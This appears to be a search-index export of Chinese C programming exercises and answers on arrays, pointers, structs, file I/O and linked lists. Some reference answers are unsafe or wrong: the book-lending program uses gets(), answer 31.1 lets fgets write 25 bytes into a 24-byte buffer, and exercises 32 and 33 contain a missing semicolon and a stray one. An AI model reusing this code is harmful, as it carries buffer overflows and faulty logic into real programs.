\u8bf7\u5b8c\u5584\u51fd\u6570<code>average</code>\u3002<code>average</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u8ba1\u7b97\u6210\u7ee9\u6570\u7ec4\u4e2d\u7684\u5e73\u5747\u6210\u7ee9\uff0c\u5e76\u5c06\u5e73\u5747\u6210\u7ee9\u8fd4\u56de\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u6210\u7ee9\u6570\u7ec4\u7684\u957f\u5ea6\u3002</li> <li><code>score</code>,\u6574\u578b\u6307\u9488\uff0c\u8868\u793a\u4fdd\u5b58\u6210\u7ee9\u7684\u6570\u7ec4\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\ndouble average (int n, int *score) {\n    double ave = 0;\n    for (int i = 0; i &lt; n; i++) {\n        ave = ave + score[i];\n    }\n    ave = ave / n;\n    return ave;\n}\n\nint main () {\n    int n = 10, score[10] = {88, 99, 76, 78, 89, 93, 95, 86, 92, 85};\n    double ave_score;\n    ave_score = average(n, score);\n    printf(\"%f\\n\", ave_score);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#28","title":"28","text":"<p>\u7528\u6307\u9488\u5bf9\u6570\u7ec4\u5143\u7d20\u6392\u5e8f</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>sort</code>\u3002<code>sort</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u4f7f\u7528\u6307\u9488\u5bf9\u6570\u7ec4\u5143\u7d20\u8fdb\u884c\u7531\u5c0f\u5230\u5927\u6392\u5e8f\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>n</code>\uff0c\u6574\u578b\uff0c\u8868\u793a\u6570\u7ec4\u957f\u5ea6\u3002</li> <li><code>p</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u8868\u793a\u9700\u8981\u6392\u5e8f\u7684\u6570\u7ec4\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid sort(int n, int* p) {\n    int i, j, t;\n    for (i = 0; i &lt; n - 1; i++) {\n        for (j = 0; j &lt; n - 1 - i; j++) {\n            if  (p[j] &gt; p[j + 1]) {\n                t = p[j];\n                p[j] = p[j + 1];\n                p[j + 1] = t;\n            }\n        }\n    }\n}\n\nint main() {\n    int arr[10], i;\n    for (i = 0; i &lt; 10; i++) {\n        scanf(\"%d\", &amp;arr[i]);\n    }\n\n    sort(10, arr);\n\n    printf(\"\u6392\u5e8f\u540e\uff1a\");\n    for (i = 0; i &lt; 10; i++) {\n        printf(\"%d \", arr[i]);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#29","title":"29","text":"<p>\u7528\u6307\u9488\u5bf9\u4e24\u4e2a\u6570\u8fdb\u884c\u4ea4\u6362</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a \u8bf7\u5b8c\u5584\u51fd\u6570<code>exchange</code>\u3002<code>exchange</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\u7528\u6307\u9488\u5bf9\u4e24\u4e2a\u6574\u6570\u8fdb\u884c\u4ea4\u6362\u3002</p> <p>\u6ce8\u610f\uff1a\u8bf7\u4e0d\u8981\u4fee\u6539 main \u51fd\u6570\u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u53c2\u6570\u8bf4\u660e</p> <ul> <li><code>p</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e00\u3002</li> <li><code>q</code>\uff0c\u6574\u578b\u6307\u9488\uff0c\u5b58\u50a8\u5f85\u4ea4\u6362\u7684\u6570\u5b57\u4e8c\u3002</li> </ul> C<pre><code>#include &lt;stdio.h&gt;\n\nvoid exchange (int *p,int *q) {\n    int t;\n    t=*p;\n    *p=*q;\n    *q=t;\n}\n\nint main() {\n    int a,b;\n    scanf(\"%d %d\",&amp;a,&amp;b);\n    exchange(&amp;a,&amp;b);\n    printf(\"\u4ea4\u6362\u540e\uff1a%d %d\\n\",a,b);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#30","title":"30","text":"<p>\u7b80\u5355\u7684\u56fe\u4e66\u501f\u9605\u7a0b\u5e8f</p> <p>\u7f16\u7a0b\u5b9e\u73b0\uff1a\u7b80\u5355\u7684\u56fe\u4e66\u501f\u9605\u7a0b\u5e8f\u3002\u5047\u5b9a\u56fe\u4e66\u4fe1\u606f\u5305\u62ec\uff1a\u7f16\u53f7\u3001\u4e66\u540d\u3001\u4ef7\u683c\u3001\u501f\u9605\u4eba\u59d3\u540d\u3001\u662f\u5426\u5df2\u501f\u51fa\u6807\u8bb0\u3002\u7a0b\u5e8f\u529f\u80fd\uff1a\u6839\u636e\u8f93\u5165\u7684\u56fe\u4e66\u7f16\u53f7\uff0c\u67e5\u627e\u5e93\u4e2d\u662f\u5426\u6709\u6b64\u56fe\u4e66\uff0c\u82e5\u65e0\u6b64\u56fe\u4e66\uff0c\u8f93\u51fa\u76f8\u5e94\u4fe1\u606f\u8868\u793a\u6ca1\u6709\u6b64\u4e66\uff1b\u82e5\u6709\uff0c\u518d\u67e5\u770b\u662f\u5426\u5df2\u88ab\u501f\u51fa\uff0c\u82e5\u6ca1\u6709\u88ab\u501f\u51fa\uff0c\u5219\u8f93\u5165\u501f\u9605\u4eba\u59d3\u540d\u5e76\u5c06\u6b64\u4e66\u6807\u8bb0\u4e3a\u501f\u51fa\uff0c\u82e5\u5df2\u88ab\u501f\u51fa\uff0c\u8f93\u51fa\u76f8\u5e94\u4fe1\u606f\u8868\u793a\u5df2\u88ab\u501f\u51fa\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\n#include&lt;string.h&gt;\n#define N 3\ntypedef struct BookList { //\u4e66\u7684\u7ed3\u6784\u4f53\n    char num[20];//\u56fe\u4e66\u7f16\u53f7\n    char name[20];//\u4e66\u540d\n    int price;//\u4e66\u7684\u4ef7\u683c\n    char person[20];//\u501f\u9605\u4eba\n    int yes;//\u5224\u65ad\u4e66\u662f\u5426\u5df2\u7ecf\u501f\u51fa,1\u6ca1\u6709\u501f\u51fa,0\u5df2\u501f\u51fa\n} Book;\nvoid bookborrow(Book *b,int n,char *bh) {\n    //\u7b80\u5355\u7684\u56fe\u4e66\u501f\u9605\u7a0b\u5e8f\n    int i,flag=0;//0\uff1a\u8981\u501f\u9605\u7684\u56fe\u4e66\u4e0d\u5b58\u5728\uff0c1\uff1a\u8981\u501f\u9605\u7684\u56fe\u4e66\u5b58\u5728\n    for(i=0; i&lt;n; i++,b++)\n        if(strcmp(b-&gt;num,bh)==0) {\n            flag=1;\n            break;\n        }\n    if (flag)\n        if(b-&gt;yes==1) {\n            printf(\"\u6b64\u4e66\u53ef\u501f\uff01\\n \");\n        } else\n            printf(\"\u6b64\u4e66\u5df2\u88ab\u501f\u51fa\uff01\\n \");\n    else\n        printf(\"\u6ca1\u6709\u6b64\u56fe\u4e66\uff01\\n \");\n}\n/* \u5176\u5b83\u53c2\u8003\u5199\u6cd5\nvoid bookborrow(Book b[], int n, char* num) {\n    int flag = 0; //0\uff1a\u8981\u501f\u9605\u7684\u56fe\u4e66\u4e0d\u5b58\u5728\uff0c1\uff1a\u8981\u501f\u9605\u7684\u56fe\u4e66\u5b58\u5728\n    for (int i = 0; i &lt; n; i++) {\n        if (strcmp(b[i].num, num) == 0) {\n            flag = 1;\n            if (b[i].yes == 1) {\n                printf(\"\u6b64\u4e66\u53ef\u501f\uff01\\n\");\n            } else {\n                printf(\"\u6b64\u4e66\u5df2\u88ab\u501f\u51fa\uff01\\n\");\n            }\n            break;\n        }\n    }\n    if (!flag) {\n        printf(\"\u6ca1\u6709\u6b64\u56fe\u4e66\uff01\\n\");\n    }\n}\n*/\nint main() {\n    Book b[N]= {{\"J001\",\"C\u8bed\u8a00\u7a0b\u5e8f\u8bbe\u8ba1\",28,\"Mary\",0},{\"J002\",\"JAVA\u7a0b\u5e8f\u8bbe\u8ba1\",35,\"\",1},{\"T001\",\"\u6570\u636e\u7ed3\u6784\",26,\"\",1}};\n    char bh[20];\n    printf(\"\u8bf7\u8f93\u5165\u8981\u501f\u9605\u7684\u56fe\u4e66\u7f16\u53f7:\\n\");\n    gets(bh);\n    bookborrow(b,N,bh);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#31_1","title":"31","text":"<p>\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u8d4b\u503c\u7ed9\u7ed3\u6784\u4f53</p> <p>\u7528\u51fd\u6570\u5b9e\u73b0\uff0c\u8bfb\u53d6\u6807\u51c6\u8f93\u5165\u5e76\u8d4b\u503c\u7ed9\u7ed3\u6784\u4f53\u3002</p> <p>\u51fd\u6570\u5b9a\u4e49</p> Text Only<pre><code>void input_person(person *p);\n</code></pre> <p>\u51fd\u6570\u8bf4\u660e</p> <p><code>input_person</code>\u51fd\u6570\u7684\u529f\u80fd\u662f\uff0c\u5c06\u8bfb\u53d6\u7684\u6807\u51c6\u8f93\u5165\u8d4b\u503c\u7ed9\u7ed3\u6784\u4f53\u3002</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#311","title":"31.1","text":"C<pre><code>#include &lt;stdio.h&gt;\n\nstruct person {\n    char name[24];\n    int age;\n};\n\nvoid input_person(struct person* p) {\n    // TODO\uff1a\u8bf7\u7f16\u5199\u4ee3\u7801\uff0c\u5c06\u6807\u51c6\u8f93\u5165\u7684\u4fe1\u606f\u8bfb\u5165 person \u7684 `p` \u4e2d\n    fgets(p-&gt;name, 25, stdin);\n    scanf(\"%d\", &amp;p-&gt;age);\n}\n\nint main() {\n    struct person p = { \"\", 0 };\n    input_person(&amp;p);\n    printf(\"\u59d3\u540d\uff1a%s\\n\", p.name);\n    printf(\"\u5e74\u9f84\uff1a%d\\n\", p.age);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#312","title":"31.2","text":"C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct {\n    char name[50];\n    int age;\n} person;\n\nvoid input_person(person *p) {\n    printf(\"\u8bf7\u8f93\u5165\u59d3\u540d: \");\n    fgets(p-&gt;name, sizeof(p-&gt;name), stdin); // \u8bfb\u53d6\u59d3\u540d\uff0c\u5305\u62ec\u6362\u884c\u7b26\n    p-&gt;name[strcspn(p-&gt;name, \"\\n\")] = '\\0'; // \u53bb\u6389\u672b\u5c3e\u7684\u6362\u884c\u7b26\n\n    printf(\"\u8bf7\u8f93\u5165\u5e74\u9f84: \");\n    scanf(\"%d\", &amp;(p-&gt;age)); // \u8bfb\u53d6\u5e74\u9f84\n    getchar(); // \u6d88\u8017\u6389\u8f93\u5165\u7f13\u51b2\u533a\u4e2d\u7684\u6362\u884c\u7b26\n}\n\nint main() {\n    person p;\n    input_person(&amp;p);\n\n    printf(\"\u59d3\u540d: %s\\n\", p.name);\n    printf(\"\u5e74\u9f84: %d\\n\", p.age);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#32_1","title":"32","text":"<p>\u4ee5\u4e0b\u7a0b\u5e8f\u7684\u529f\u80fd\u662f\u5c06\u6587\u4ef6file1.c\u7684\u5185\u5bb9\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a\u5e76\u590d\u5236\u5230\u6587\u4ef6file2.c \u4e2d\uff0c\u8bf7\u586b\u5165\u9002\u5f53\u5185\u5bb9\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\nint main() {\n    FILE  *fp1,*fp2;\n    //FILE _____;\n    char ch;\n    fp1=fopen(\"file1.c\",\"r\");\n    fp2=fopen(\"file2.c\",\"w\");\n    while((ch=fgetc(fp1))!=EOF) {\n        putchar(ch);\n        //putchar(_____);\n        fputc(ch,fp2)\n        //fputc(_____)\n    }\n    fclose(fp1);\n    fclose(fp2);\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#33","title":"33","text":"<p>\u4e0b\u9762\u7a0b\u5e8f\u4ece\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u8bfb\u5165\u7ed3\u6784\u4f53\u6570\u636e\uff0c\u5e76\u628a\u7ed3\u6784\u4f53\u6570\u636e\u663e\u793a\u5728\u7ec8\u7aef\u5c4f\u5e55\u4e0a\u3002\u8bf7\u586b\u5165\u9002\u5f53\u5185\u5bb9\u3002</p> C<pre><code>#include&lt;stdio.h&gt;\n\nstruct rec {\n    int num;\n    float total;\n};\n\nint main() {\n    FILE* f;\n    if ((f = fopen(\"bin.dat\", \"rb\")) == NULL);\n    {\n        printf(\"cannot open\\n\");\n        exit(0);\n    }\n    reout(f);\n    fclose(f);\n    return 0;\n}\n\nvoid reout(FILE* f) {\n//void reout(_____) {\n    struct rec r;\n    fread(&amp;r, sizeof(struct rec), 1, f);    \n    //fread(&amp;r,_____, 1, f);\n    while (!feof(f)) {\n        printf(\"%df,%f\\n\", r.num, r.total);\n        //printf(\"%df,%f\\n\", _____);\n        fread(&amp;r, sizeof(struct rec), 1, f);\n        //fread(&amp;r,_____, 1, f);\n    }\n}\n</code></pre>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#34","title":"34","text":"<p>\u4e0b\u8ff0\u7a0b\u5e8f\u5411\u6587\u4ef6\u8f93\u51fa\u7684\u7ed3\u679c\u662f</p> C<pre><code>void WriteStr1(char *fn,char *str,char *rw) {\n    FILE *fp;\n    fp=fopen(fn,rw);\n    fputs(str,fp);\n    fclose(fp);\n}\n\nvoid WriteStr2(char *fn,char *str,char *rw) {\n    FILE *fp;\n    fp=fopen(fn,rw);\n    rewind(fp);\n    fputs(str,fp);\n    fclose(fp);\n}\n\nint main() {\n    WriteStr1(\"t1.dat\",\"start\",\"w\");\n    WriteStr2(\"t1.dat\",\"end\",\"a\");\n    return 0;\n}\n</code></pre> <p>startend </p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#35","title":"35","text":"<p>**\u4ee5\u4e0b\u7a0b\u5e8f\u8f93\u51fa\u7684\u7ed3\u679c\u662f    **</p> C<pre><code>#include &lt;stdio.h&gt;\nint main() {\n    FILE *fp;\n    int i=20,j=30,k=40,n=50;\n    fp=fopen(\"d1.dat\",\"w\");\n    fprintf(fp,\"%d %d\\n\",i,j);\n    fprintf(fp,\"%d %d\\n\",k,n);\n    fclose(fp);\n    fp=fopen(\"d1.dat\",\"r\");\n    fseek(fp,4,0);\n    fscanf(fp,\"%d%d\",&amp;k,&amp;n);\n    printf(\"%d,%d\\n\",k,n);\n    fclose(fp);\n    return 0;\n}\n</code></pre> <p>0,40</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#36","title":"36","text":"<p>\u7a0b\u5e8f\u8fd0\u884c\u540e\u7684\u8f93\u51fa\u7ed3\u679c\u662f</p> C<pre><code>int main() {\n    FILE *fp;\n    int  i, k, n;\n    fp=fopen(\"data.dat\", \"w+\");\n    for(i=1; i&lt;6; i++) {\n        fprintf(fp,\"%d\",i);\n        if(i%3==0)  fprintf(fp,\"%c\",'\\n');\n    }\n    rewind(fp);\n    fscanf(fp,\"%d%d\",&amp;k,&amp;n);\n    printf(\"%d %d\\n\", k,n);\n    fclose(fp);\n    return 0;\n}\n</code></pre> <p>123 45</p>"},{"location":"DEC/C/%E6%9C%9F%E6%9C%AB%E5%BF%85%E5%81%9A%E9%A2%98/#37","title":"37","text":"<p>\u4e0b\u8ff0\u7a0b\u5e8f\u8f93\u51fa\u7684\u7ed3\u679c\u662f</p> C<pre><code>int main( ) {\n    FILE *fp;\n    int i,a[4]= {1,2,3,4},b;\n    fp=fopen(\"data.dat\",\"wb\");\n    for(i=0; i&lt;4; i++)\n        fwrite(&amp;a[i],sizeof(int),1,fp);\n    fclose(fp);\n    fp=fopen(\"data.dat\",\"rb\");\n    fseek(fp,-2*sizeof(i),SEEK_END);\n    fread(&amp;b,sizeof(int),1,fp);\n    fclose(fp);\n    printf(\"%d\\n\",b) ;\n    return 0;\n}\n</code></pre> <p>3</p>"},{"location":"DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/","title":"\u94fe\u8868\u4f5c\u4e1a","text":"<p>\u4f5c\u4e1a\u5982\u4e0b\uff1a\uff08\u8fd9\u662f\u4e00\u4e2a\u5b66\u751f\u4fe1\u606f\u7ba1\u7406\u7cfb\u7edf\uff0c\u4e3b\u8981\u8003\u5bdf\u5bf9\u94fe\u8868\u7684\u76f8\u5173\u64cd\u4f5c\uff0c\u6839\u636e\u4e0b\u9762\u7ed9\u51fa\u7684\u4ee3\u7801\u5c06\u76f8\u5e94\u7684\u51fd\u6570\u8865\u5168\uff09</p>"},{"location":"DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/#_1","title":"\u9898\u76ee\uff1a","text":"C<pre><code>//\u5c06\u4e0b\u9762\u7a0b\u5e8f\u4e66\u5199\u5b8c\u6574\u3002\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#define N1 5\n#define N2 3\n\nstruct student {\n    int num;\n    char name[10];\n    float score;\n};\n\nint main() {\n    //\u8f93\u5165\u5b66\u751f\u4fe1\u606f\u5230\u6570\u7ec4\uff0cn\u4e3a\u5b66\u751f\u4e2a\u6570\n    void input(struct student stu[], int n);\n\n    //\u5c06\u6570\u7ec4\u4e2dn\u4e2a\u5b66\u751f\u4fe1\u606f\u7684\u5efa\u7acb\u4e00\u4e2a\u5355\u94fe\u8868\n    struct student* create(struct student stu[], int n);\n\n    //\u5c06\u6570\u7ec4\u4e2dn\u4e2a\u5b66\u751f\u6309\u7167\u6210\u7ee9\u6392\u5e8f\uff0c\u671f\u4e2dby\u662f'U'\u5347\u5e8f\uff0c\u662f'D \u964d\u5e8f\n    void sort(struct student stu[], int n, char by);\n\n    //\u6309\u7167by\u4e3a'U'\u5347\u5e8f\uff0c'D\u964d\u5e8f\uff0c\u5408\u5e76\u4e24\u4e2a\u5355\u94fe\u8868\u6210\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u8fd4\u56de\u5408\u5e76\u540e\u94fe\u8868\u7684\u5934\u6307\u9488\n    struct student* combine(struct student* h1, struct student* h2, char by);\n\n    //\u8f93\u51fa\u5355\u94fe\u8868\u4e2d\u5b66\u751f\u4fe1\u606f\uff0c\u8981\u6c42\u6bcf\u884c\u4e00\u4e2a\u5b66\u751f\u4fe1\u606f:\u5b66\u53f7 \u59d3\u540d \u6210\u7ee9\n    void print(struct student* h);\n\n    //\u94fe\u8868\u4e2d\u5220\u9664stu\u7ed3\u70b9\n    void delete(struct student* h, struct student stu);\n\n    struct student stul[N1];\n    struct student stu2[N2];\n    struct student *h,*h1,*h2;\n\n    input(stu1,N1);\n    input(stu2,N2);\n\n    sort(stul, N1, 'U');\n    sort(stu2, N2, 'D');\n\n    h1 = create(stu1, N1);\n    h2 = create(stu2, N2);\n    h = combine(h1, h2, 'D');\n\n    print(h);\n    delete(h, stu1[1]);\n    print(h);\n\n    return 0;\n\n}\n//\u7531\u6b64\u5411\u4e0b\u5b8c\u6210main\u51fd\u6570\u4e2d\u8c03\u7528\u7684\u51fd\u6570\n</code></pre>"},{"location":"DEC/C/%E9%93%BE%E8%A1%A8%E4%BD%9C%E4%B8%9A/#_2","title":"\u7b54\u6848\uff1a","text":"C<pre><code>#define _CRT_SECURE_NO_WARNINGS 1\n\n#include &lt;stdio.h&gt; // \u8f93\u5165\u8f93\u51fa\u51fd\u6570\n#include &lt;stdlib.h&gt; // \u52a8\u6001\u5185\u5b58\u5206\u914d\n#include &lt;string.h&gt; // \u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\n\n// \u4f7f\u7528\u5b8f\u5b9a\u4e49\u5b9a\u4e49\u4e86\u4e24\u4e2a\u5e38\u91cfN1\u548cN2\uff0c\u5206\u522b\u8868\u793a\u4e24\u4e2a\u5b66\u751f\u6570\u7ec4\u7684\u5927\u5c0f\n#define N1 5\n#define N2 3\n\n// \u51fd\u6570\u58f0\u660e\nvoid input(struct student stu[], int n);\nvoid sort(struct student stu[], int n, char by);\nstruct student* create(struct student stu[], int n);\nstruct student* combine(struct student* h1, struct student* h2, char by);\nvoid print(struct student* h);\nvoid delete(struct student* h, struct student stu);\n\n// \u5b9a\u4e49\u5b66\u751f\u7ed3\u6784\u4f53\nstruct student {\n    int num;\n    char name[10];\n    float score;\n    struct student* next;\n    // \u6307\u5411\u4e0b\u4e00\u4e2a\u5b66\u751f\u7ed3\u6784\u4f53\u7684\u6307\u9488next\n};\n\nint main() {\n    struct student stu1[N1];\n    struct student stu2[N2];\n    struct student* h, * h1, * h2;\n    // *h1 \u548c *h2 \u5206\u522b\u662f\u4e24\u4e2a\u6570\u7ec4\u6784\u6210\u5355\u94fe\u8868\u4e4b\u540e\u7684\u5934\u6307\u9488\n    // *h \u662f\u4e24\u4e2a\u5355\u94fe\u8868\u5408\u5e76\u4e3a\u4e00\u4e2a\u5355\u94fe\u8868\u4e4b\u540e\u7684\u5934\u6307\u9488\n\n    input(stu1, N1);\n    printf(\"\\n\");\n    input(stu2, N2);\n\n    sort(stu1, N1, 'U');\n    sort(stu2, N2, 'D');\n\n    h1 = create(stu1, N1);\n    h2 = create(stu2, N2);\n    h = combine(h1, h2, 'D');\n\n    printf(\"\u5408\u5e76\u540e\u7684\u94fe\u8868\uff1a\\n\");\n    print(h);\n\n    delete(h, stu1[1]);\n\n    printf(\"\u5220\u9664\u8282\u70b9\u540e\u7684\u94fe\u8868\uff1a\\n\");\n    print(h);\n\n    return 0;\n}\n\n// \u8f93\u5165\u5b66\u751f\u4fe1\u606f\u5230\u6570\u7ec4\uff0cn\u4e3a\u5b66\u751f\u4e2a\u6570\nvoid input(struct student stu[], int n) {\n    printf(\"\u8bf7\u8f93\u5165\u5b66\u751f\u4fe1\u606f\uff1a\\n\");\n    for (int i = 0; i &lt; n; i++) {\n        printf(\"\u5b66\u53f7\uff1a\");\n        scanf(\"%d\", &amp;stu[i].num);\n        printf(\"\u59d3\u540d\uff1a\");\n        scanf(\"%s\", stu[i].name);\n        printf(\"\u6210\u7ee9\uff1a\");\n        scanf(\"%f\", &amp;stu[i].score);\n\n        printf(\"\\n\");\n    }\n}\n\n// \u5c06\u6570\u7ec4\u4e2dn\u4e2a\u5b66\u751f\u6309\u7167\u6210\u7ee9\u6392\u5e8f\uff0cby\u662f'U'\u5347\u5e8f\uff0c\u662f'D'\u964d\u5e8f\nvoid sort(struct student stu[], int n, char by) {\n    // \u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\uff0c\u53ef\u4ee5\u6839\u636e\u9700\u8981\u66ff\u6362\u6210\u5176\u4ed6\u6392\u5e8f\u7b97\u6cd5\n    for (int i = 0; i &lt; n - 1; i++) {\n        for (int j = 0; j &lt; n - i - 1; j++) {\n            if ((by == 'U' &amp;&amp; stu[j].score &gt; stu[j + 1].score) ||\n                (by == 'D' &amp;&amp; stu[j].score &lt; stu[j + 1].score)) {\n                // \u4ea4\u6362\u5b66\u751f\u4fe1\u606f\n                struct student temp = stu[j];\n                stu[j] = stu[j + 1];\n                stu[j + 1] = temp;\n            }\n        }\n    }\n}\n\n// \u5c06\u6570\u7ec4\u4e2dn\u4e2a\u5b66\u751f\u4fe1\u606f\u7684\u5efa\u7acb\u4e00\u4e2a\u5355\u94fe\u8868\n// \u63a5\u53d7\u4e00\u4e2a\u5305\u542b\u5b66\u751f\u7ed3\u6784\u4f53\u7684\u6570\u7ec4 stu[] \u548c\u6574\u6570 n \u4f5c\u4e3a\u8f93\u5165\n// \u4e3a\u6bcf\u4e2a\u5b66\u751f\u52a8\u6001\u5206\u914d\u5185\u5b58\uff0c\u5c06\u6570\u7ec4\u4e2d\u7684\u4fe1\u606f\u590d\u5236\u5230\u65b0\u7684\u8282\u70b9\u4e2d\uff0c\u5e76\u901a\u8fc7\u6307\u9488\u8fde\u63a5\u8fd9\u4e9b\u8282\u70b9\u4ee5\u521b\u5efa\u94fe\u8868\n// \u8fd4\u56de\u94fe\u8868\u7684\u5934\u6307\u9488\nstruct student* create(struct student stu[], int n) {\n    struct student* head = NULL; // \u5934\u6307\u9488\u521d\u59cb\u5316\u4e3a\u7a7a\n    struct student* tail = NULL; // \u521d\u59cb\u5316\u5c3e\u6307\u9488\u4e3aNULL\n    // \u8fd9\u513f\u5982\u679c\u4e0d\u5c06\u5c3e\u6307\u9488\u521d\u59cb\u5316\u4e3aNULL\uff0cDevC++\u80fd\u76f4\u63a5\u7f16\u8bd1\uff0c\u4f46\u662fVisual Studio 2022\u4f1a\u7f16\u8bd1\u5931\u8d25\n    // \u8fd9\u513f\u7684\u5c3e\u6307\u9488\u7528\u4e8e\u8ddf\u8e2a\u94fe\u8868\u7684\u5c3e\u90e8\uff0c\u800c\u5728\u94fe\u8868\u5f00\u59cb\u65f6\uff0c\u5c1a\u672a\u6709\u4efb\u4f55\u8282\u70b9\uff0c\u56e0\u6b64\u5c3e\u6307\u9488\u5e94\u8be5\u4e3aNULL\n    // \u6700\u597d\u5c06\u6307\u9488\u5728\u58f0\u660e\u65f6\u521d\u59cb\u5316\u4e3aNULL\uff0c\u7279\u522b\u662f\u5728\u5b83\u4eec\u7528\u4e8e\u8ddf\u8e2a\u94fe\u8868\u7b49\u6570\u636e\u7ed3\u6784\u7684\u60c5\u51b5\u4e0b\n    struct student* temp;\n\n    for (int i = 0; i &lt; n; i++) {\n        temp = (struct student*)malloc(sizeof(struct student)); // \u4e3a\u65b0\u8282\u70b9\u5206\u914d\u5185\u5b58\n        if (temp == NULL) {\n            printf(\"\u5185\u5b58\u5206\u914d\u5931\u8d25\\n\");\n            exit(1);\n            //\u8fd9\u91cc\u7684exit()\u64cd\u4f5c\u53ef\u4ee5\u5220\u9664\uff0c\u5b83\u66f4\u50cf\u662f\u4e00\u79cd\u5e94\u6025\u64cd\u4f5c\n            //\u4e0d\u6b62\u8fd9\u91cc\uff0c\u4ee3\u7801\u4e2d\u6240\u6709\u7684exif\u90fd\u53ef\u4ee5\u5220\u9664\n        }\n\n        // \u5c06\u6570\u7ec4\u4e2d\u7684\u5b66\u751f\u4fe1\u606f\u590d\u5236\u5230\u65b0\u8282\u70b9\n        temp-&gt;num = stu[i].num;\n        strcpy(temp-&gt;name, stu[i].name);\n        temp-&gt;score = stu[i].score;\n        temp-&gt;next = NULL;\n\n        if (head == NULL) {\n            head = temp; // \u5982\u679c\u662f\u7b2c\u4e00\u4e2a\u8282\u70b9\uff0c\u76f4\u63a5\u4f5c\u4e3a\u5934\u8282\u70b9\n        }\n        else {\n            tail-&gt;next = temp; // \u5426\u5219\u52a0\u5165\u5230\u94fe\u8868\u7684\u5c3e\u90e8\n        }\n\n        tail = temp; // \u66f4\u65b0\u5c3e\u6307\u9488\n\n        tail-&gt;next = NULL; //\u5c06\u6700\u540e\u4e00\u4e2a\u6307\u9488\u4e2d\u7684next\u6307\u5411\u4e3a\u7a7a\n        //\u4e00\u822c\u6765\u8bf4\u6700\u597d\u6709\u8fd9\u4e48\u4e00\u4e2a\u6b65\u9aa4\uff0c\u4f46\u662f\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u4e0d\u9700\u8981\u4e86\n        //\u56e0\u4e3a\u4e0a\u8fb9\u5df2\u7ecf temp-&gt;next = NULL;\u7136\u540e tail = temp;\u4e86\n    }\n\n    return head; // \u8fd4\u56de\u5934\u6307\u9488\n}\n\n// \u5408\u5e76\u4e24\u4e2a\u5355\u94fe\u8868\u6210\u4e00\u4e2a\u5355\u94fe\u8868\uff0c\u8fd4\u56de\u5408\u5e76\u540e\u94fe\u8868\u7684\u5934\u6307\u9488\n// \u63a5\u53d7\u4e24\u4e2a\u94fe\u8868\u7684\u5934\u6307\u9488head1\u548chead2\u4f5c\u4e3a\u53c2\u6570\n// \u9996\u5148\u5224\u65adhead1\u548chead2\u662f\u5426\u4e3a\u7a7a\uff0c\u5982\u679c\u5176\u4e2d\u4e00\u4e2a\u4e3a\u7a7a\uff0c\u76f4\u63a5\u8fd4\u56de\u53e6\u4e00\u4e2a\u94fe\u8868\u7684\u5934\u6307\u9488\n// \u7136\u540e\uff0c\u6839\u636e\u5b66\u751f\u6210\u7ee9\u7684\u5927\u5c0f\uff0c\u5c06head1\u548chead2\u4e2d\u7684\u8282\u70b9\u9010\u4e2a\u8fde\u63a5\u8d77\u6765\uff0c\u5f62\u6210\u4e00\u4e2a\u65b0\u7684\u94fe\u8868\n// 